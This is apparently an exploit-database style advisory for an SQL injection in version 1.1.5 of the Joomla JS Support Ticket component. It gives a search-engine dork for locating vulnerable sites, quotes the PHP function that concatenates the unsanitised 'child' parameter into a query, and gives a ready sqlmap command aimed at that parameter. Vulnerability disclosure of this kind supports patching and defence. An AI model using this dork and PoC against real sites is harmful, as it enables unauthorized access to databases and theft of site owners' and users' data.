#Dork: inurl:"index.php?option=com_jssupportticket"
#Exploit Author: qw3rTyTy
#Vendor Homepage: https://www.joomsky.com/
#Software Link: https://www.joomsky.com/46/download/1.html
#Version: 1.1.5
#Tested on: Debian/nginx/joomla 3.9.0
#####################################
#Vulnerability details:
#####################################
Vulnerable code is in line 441 in file admin/models/userfields.php

   439	    function dataForDepandantField( $val , $childfield){ 
   440	        $db = $this->getDBO();
   441	        $query = "SELECT userfieldparams,fieldtitle,field,depandant_field FROM `#__js_ticket_fieldsordering` WHERE field = &#039;".$childfield."&#039;"; //!!!
   442	        $db->setQuery($query);
   443	        $data = $db->loadObject();
   444	        $decoded_data = json_decode($data->userfieldparams); 
   445	        $comboOptions = array(); 
   446	        $flag = 0; 
   447	        foreach ($decoded_data as $key => $value) { 
   448	            if($key == $val){ 
   449	               for ($i=0; $i < count($value) ; $i++) {  
   450	                if($flag == 0){
   451	                    $comboOptions[] = array(&#039;value&#039; => &#039;&#039;, &#039;text&#039; => JText::_(&#039;Select&#039;).&#039; &#039;.$data->fieldtitle); 
   452	                }
   453	                $comboOptions[] = array(&#039;value&#039; => $value[$i], &#039;text&#039; => $value[$i]); 
   454	                $flag = 1; 
   455	               } 
   456	            } 
   457	        }
   458	        $jsFunction = &#039;&#039;; 
   459	        if ($data->depandant_field != null) {
   460	            $jsFunction = "onchange=getDataForDepandantField(&#039;" . $data->field . "&#039;,&#039;" . $data->depandant_field . "&#039;,1);";
   461	        }
   462	        $html = JHTML::_(&#039;select.genericList&#039;, $comboOptions , $childfield,&#039;class="inputbox one"&#039;.$jsFunction, &#039;value&#039; , &#039;text&#039; ,&#039;&#039;);
   463	        return $html; 
   464	    }

#####################################
#PoC:
#####################################
$> sqlmap.py -u "http://localhost/index.php?option=com_jssupportticket&c=ticket&task=datafordepandantfield&fvalue=0&child=0" --random-agent -p child --dbms=mysql

